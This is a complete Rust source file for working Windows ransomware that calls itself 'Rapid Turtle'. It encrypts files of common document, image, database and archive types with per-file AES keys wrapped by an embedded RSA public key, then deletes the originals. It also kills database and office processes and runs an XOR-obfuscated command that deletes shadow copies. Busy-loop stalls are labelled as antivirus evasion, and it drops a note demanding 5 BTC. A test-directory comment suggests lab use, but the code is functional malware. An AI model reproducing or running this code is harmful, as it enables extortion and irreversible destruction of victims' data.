use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
use rsa::pkcs8::DecodePublicKey;
use rand::{Rng, RngCore, thread_rng}; 
use rayon::prelude::*;
use walkdir::WalkDir;
use std::fs::{File};
use std::io::{Read, Write};
use std::process::Command;
use std::path::Path;
use std::time::Instant;
use std::hint::black_box;

// WinAPI imports
use windows_sys::Win32::System::Threading::CreateMutexW;
use windows_sys::Win32::Foundation::{GetLastError, ERROR_ALREADY_EXISTS, CloseHandle};

// BASIC CONFIG //
const RSA_PUBLIC_KEY_PEM: &str = r#"-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAkXBL8kffP+8k57CapwTa
9c6nXRjPGIW1xrE5AaqnQvx18sAqRB6/RcGm7afDuY3V3O7ZYEeT0ExqHLuDCXBd
RoT9UFvDAenYOcz+GcPAxkv9x5iCMSSBIe3ZJA99F//zdzD95gjETypFu56Cp152
o5ghjHyo0YKsxt3uGkcXC6c+Ga9KZO5fgxhCxDqwxN/bCJWMmCY5/bAKJDbAP4kX
8fHlpIE2UFqNGPb3BDiUa4TcLBlU/RmbL/b9ewwYGcULJSrctqNte0bWNQ/dbxLZ
3LOxRemPxWF4O1aU/lnaXLteYvZxPCsL89oMBKA2odbz9WwEaztvux8f1ZJoZUQv
QRNNk/zIvuYfYDf2Fxn8oqNq5tYrF5zrBTtv5pYIMhhfrdzuVxbgIam174stAa1Y
/MspD6lXqIxac5PBSlMxfXF+2ZkSdO9EZ638orb8pFAasb57VfrX6RveKVcpvMYf
h/TMoGDblJ3kT5sxRSJHdjt3cV6ARag5FsN57hh/y0nrcf+Xv8kyEkN50vqTh1ML
/yWEQYvr1bC0wYVPuLtpqiX6IhkU4kd7LoslG88l18fr02oxxlh9c6Nc8TK3j9m5
pjZ6SdxEBijvYsHZbY2vw85aKmVdsDodWhC4LTmYCXczaZKcH1NQLo2X5fbVxWrv
wZSidQGZ4W86PdpVdy49FYMCAwEAAQ==
-----END PUBLIC KEY-----"#;
const RANSOM_NOTE: &str = "ALL YOUR FILES ARE ENCRYPTED. To decrypt, send 5 BTC to bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kygt080. Your ID: {id}";
const TARGET_EXTENSIONS: &[&str] = &["md","doc", "docx", "ppt", "pptx", "eml", "pdf", "jpg", "jpeg", "png", "txt", "xlsx", "sql", "db", "ps1", "psm", "zip", "7z","csv","mov"];
const PROCESSES_TO_KILL: &[&str] = &["sqlservr.exe", "outlook.exe", "winword.exe", "vmtoolsd.exe"];

// mutex for our instance
//b"Global\\HalcyDOOKen_Mutex_2804\0"
const MUTEX_NAME: [u16; 30] = [
    0x0047, 0x006C, 0x006F, 0x0062, 0x0061, 0x006C, 0x005C, 0x0048, 
    0x0061, 0x006C, 0x0063, 0x0079, 0x0044, 0x004F, 0x004F, 0x004B, 
    0x0065, 0x006E, 0x005F, 0x004D, 0x0075, 0x0074, 0x0065, 0x0078, 
    0x005F, 0x0032, 0x0038, 0x0030, 0x0034, 0x0000
];

//XOR Key
const X_KEY: u8 = 0x55;

const INNER_ITERATIONS: i32 = 100_000;
const STALL_SECONDS: f64 = 32.0;

struct EncryptionEngine {
    pub_key: RsaPublicKey,
}

impl EncryptionEngine {
    fn new() -> Self {
        let pub_key = RsaPublicKey::from_public_key_pem(RSA_PUBLIC_KEY_PEM)
            .expect("Failure loading RSA Public Key. Check format.");
        Self { pub_key }
    }

    fn encrypt_file(&self, path: &std::path::PathBuf) -> std::io::Result<()> {
        // generate unique symmetric key and nonce for each file
        let mut symmetric_key = [0u8; 32];
        let mut nonce_bytes = [0u8; 12];
        thread_rng().fill_bytes(&mut symmetric_key);
        thread_rng().fill_bytes(&mut nonce_bytes);

        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&symmetric_key));
        let nonce = Nonce::from_slice(&nonce_bytes);

        // read in file contents
        let mut file = File::open(path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;

        // encrypt contents
        let ciphertext = cipher.encrypt(nonce, buffer.as_ref())
            .map_err(|e| std::io::Error::other(e.to_string()))?;

        // protect symmetric key with public key
        let mut rng = thread_rng();
        let encrypted_key = self.pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, &symmetric_key)
            .map_err(|e| std::io::Error::other(e.to_string()))?;

        // write encrypted content + footer (nonce + encrypted key)
        let new_filename = format!(
            "{}.hare",
            path.file_name()
                .unwrap()
                .to_string_lossy()
        );
        let mut out_file = File::create(path.with_file_name(new_filename))?;
        out_file.write_all(&ciphertext)?;
        out_file.write_all(&nonce_bytes)?; 
        out_file.write_all(&encrypted_key)?;
        out_file.sync_all()?;

        // Delete files
        std::fs::remove_file(path)?;
        Ok(())
    }
}

/// create mutex
/// returns true for first instance, false if dupe
fn check_single_instance() -> bool {

    unsafe {
        // create mutex with given name
        let handle = CreateMutexW(std::ptr::null(), 0, MUTEX_NAME.as_ptr());
        
        if handle == 0 {
            return false; // failed mutex creation
        }

        if GetLastError() == ERROR_ALREADY_EXISTS {
            println!("[!] Only accepting the OG Turtle. Get Off the track.");
            CloseHandle(handle);
            return false;
        }
        true
    }
}

/// Stall with busy work - intended to keep AV off our ass
fn race_preparations() -> f64 {
    let start = Instant::now();
    let mut result = 0.0;

    loop {
        for i in 0..INNER_ITERATIONS {
            let x = i as f64;
            result = black_box((x.sin() * x.cos()) / ((x + 1.0).tan() + 1.0));
        }

        let elapsed = start.elapsed().as_secs_f64();
        if elapsed >= STALL_SECONDS {
            break;
        }
    }

    result
}

/// XOR-decode bytes back into a String
fn x_decode(input: &[u8], key: u8) -> String {
    input.iter().map(|b| (b ^ key) as char).collect()
}

fn system_sabotage() {
    for proc in PROCESSES_TO_KILL {
        let _ = Command::new("taskkill").args(["/F", "/IM", proc]).output();
    }
    
    //xor encoded vssadmin delete of shadow copies
    let e_command = [35, 38, 38, 52, 49, 56, 60, 59, 117, 49, 48, 57, 48, 33, 48, 117, 38, 61, 52, 49, 58, 34, 38, 117, 122, 52, 57, 57, 117, 122, 36, 32, 60, 48, 33];
    let d_command = x_decode(&e_command, X_KEY);

    // delete shadow copies
    let _ = Command::new("cmd").args(["/c", d_command.as_str()]).output();
}

fn create_ransom_note(dir: &Path) {
    let victim_id = thread_rng().r#gen::<u32>();
    let note_content = RANSOM_NOTE.replace("{id}", &victim_id.to_string());
    let note_path = dir.join("READ_ME_FOR_DECRYPT.txt");
    if let Ok(mut file) = File::create(note_path) {
        let _ = file.write_all(note_content.as_bytes());
    }
}

fn main() {
    //println!("[Debug] First line of main reached!");
    // --- MUTEX IMPLEMENTATION ---
    // Check if The Rapid Turtle is already running
    if !check_single_instance() {
        //println!("[Debug] Exiting from mutex func");
        std::process::exit(0);
    }

    println!("[...] Patience, Turtle is on their way...");

    let lacing_up = black_box(race_preparations());
    let _left_shoe = lacing_up;

    println!("[*] Starting shot fired! Loosing a Rapid Turtle...");
    
    //sabotage system recovery
    system_sabotage();

    println!("[...] False start! Resetting - gotta wait for turtle...");

    let _false_start = black_box(race_preparations());
    let _right_shoe = _false_start;

    let engine = EncryptionEngine::new();
    let root_dir = "C:\\Temp"; // CHANGE to desired test location

    // multithread directory traversal and encryption for speed
    let files: Vec<_> = WalkDir::new(root_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path().extension()
                .and_then(|s| s.to_str())
                .map(|ext| TARGET_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .collect();

    files.par_iter().for_each(|entry| {
        let path = entry.path().to_path_buf();
        if let Err(e) = engine.encrypt_file(&path) {
            eprintln!("Error with a participant {:?}: {}", path, e);
        }
    });

    // drop ransom note
    create_ransom_note(Path::new(root_dir));

    println!("[+] Rapid Turtle finished the race. You have lost!");
}
